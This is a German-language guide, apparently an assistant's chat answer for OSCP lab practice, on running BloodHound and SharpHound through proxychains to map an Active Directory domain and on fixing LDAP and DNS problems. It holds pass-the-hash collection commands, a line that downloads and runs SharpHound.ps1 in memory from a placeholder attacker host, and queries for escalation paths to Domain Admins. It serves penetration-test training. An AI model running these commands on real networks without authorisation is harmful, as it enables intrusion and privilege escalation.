**BloodHound Ingestor über Proxy laufen lassen:**

**Option 1: bloodhound-python (am einfachsten über Proxy):**

bash

```bash
# Alle Daten sammeln
proxychains bloodhound-python -u username -p 'password' -d domain.local -dc dc01.domain.local -c All -ns 10.10.10.100

# Oder mit NTLM-Hash
proxychains bloodhound-python -u username --hashes :NTLM_HASH -d domain.local -dc dc01.domain.local -c All -ns 10.10.10.100
```

**Collection-Optionen:**

bash

```bash
# Nur das Wichtigste (schneller)
-c DCOnly

# Standard (empfohlen)
-c All

# Granular auswählen
-c Group,LocalAdmin,Session,Trusts,Default,RDP,DCOM,PSRemote
```

**Option 2: SharpHound (wenn du bereits Shell auf Windows-Maschine hast):**

bash

```bash
# SharpHound.exe auf Target hochladen (z.B. via evil-winrm)
proxychains evil-winrm -i dc01.domain.local -u username -p 'password'

# Auf der Windows-Shell:
.\SharpHound.exe -c All --zipfilename bloodhound.zip

# Runterladen
download bloodhound.zip
```

**Option 3: SharpHound via Invoke-Expression:**

bash

```bash
proxychains evil-winrm -i dc01.domain.local -u username -p 'password'

# In der Session:
IEX(New-Object Net.WebClient).DownloadString('http://YOUR_IP/SharpHound.ps1')
Invoke-BloodHound -CollectionMethod All -ZipFileName output.zip
```

**BloodHound GUI starten und Daten importieren:**

bash

```bash
# Neo4j starten
sudo neo4j console
# Browser: http://localhost:7474
# Default Creds: neo4j/neo4j (ändern bei erstem Login)

# BloodHound starten
bloodhound

# Daten importieren: Upload Data -> JSON files auswählen
```

**Troubleshooting:**

**DNS-Probleme:**

bash

```bash
# /etc/hosts sollte gesetzt sein!
10.10.10.100  dc01 dc01.domain.local domain.local
```

**Kerberos Clock Skew:**

bash

```bash
sudo ntpdate dc01.domain.local
```

**Slow Collection:**

bash

```bash
# Nur DCOnly für schnelle Enum
proxychains bloodhound-python -u username -p 'password' -d domain.local -dc dc01.domain.local -c DCOnly -ns 10.10.10.100
```

**Pro-Tip für OSCP:** Nach dem Import sofort diese Queries checken:

- "Shortest Path to Domain Admins from Owned Principals"
- "Find all Domain Admins"
- "Find Computers with Unsupported Operating Systems"
- "List all Kerberoastable Accounts"

Markiere deine compromised Accounts als "owned" in BloodHound (Rechtsklick -> Mark User as Owned), dann zeigt dir BloodHound automatisch die besten Eskalationspfade! 


https://github.com/SpecterOps/SharpHound

**Problem: SharpHound kann nicht auf LDAP connecten**

Das liegt daran, dass SharpHound die Domain-Controller nicht erreichen kann. Hier die Lösungen:

**Lösung 1: Domain Controller explizit angeben:**

powershell

```powershell
# DC-IP oder Hostname direkt angeben
.\sh1.exe -c All -d corp.local --domaincontroller 10.10.10.100

# Oder mit Hostname falls DNS funktioniert
.\sh1.exe -c All -d corp.local --domaincontroller DC01.corp.local
```

**Lösung 2: DNS-Server setzen (falls nicht gesetzt):**

powershell

```powershell
# Prüfen welcher DNS-Server aktiv ist
ipconfig /all

# Falls falsch/leer, DNS temporär setzen:
$adapter = Get-NetAdapter | Where-Object {$_.Status -eq "Up"}
Set-DnsClientServerAddress -InterfaceAlias $adapter.Name -ServerAddresses ("10.10.10.100")
```

**Lösung 3: Mit Credentials (falls nötig):**

powershell

```powershell
# Wenn du andere Credentials brauchst
.\sh1.exe -c All --ldapusername username@corp.local --ldappassword 'password'
```

**Lösung 4: bloodhound-python von Kali (EMPFOHLEN für Pivoting):**

bash

```bash
# Einfacher und funktioniert besser über Proxy
proxychains bloodhound-python -u username -p 'password' -d corp.local -dc dc01.corp.local -c All -ns 10.10.10.100

# /etc/hosts checken!
echo "10.10.10.100  dc01 dc01.corp.local corp.local" | sudo tee -a /etc/hosts
```

**Troubleshooting:**

**DNS-Check auf der Windows-Shell:**

powershell

```powershell
# Kann die Domain aufgelöst werden?
nslookup corp.local
nslookup dc01.corp.local

# LDAP-Port erreichbar?
Test-NetConnection -ComputerName 10.10.10.100 -Port 389
Test-NetConnection -ComputerName 10.10.10.100 -Port 636
```

**Direkter LDAP-Test:**

powershell

```powershell
# Mit nltest Domain Controller finden
nltest /dclist:corp.local
nltest /dsgetdc:corp.local
```

**Für OSCP: Meine Empfehlung:**

Da du eh schon über Proxy arbeitest, nutze **bloodhound-python von Kali** - das ist beim Pivoting deutlich zuverlässiger:

bash

```bash
# /etc/hosts setzen
sudo nano /etc/hosts
10.10.10.100  dc01 dc01.corp.local corp.local

# BloodHound sammeln
proxychains bloodhound-python -u username -p 'password' -d corp.local -dc dc01.corp.local
```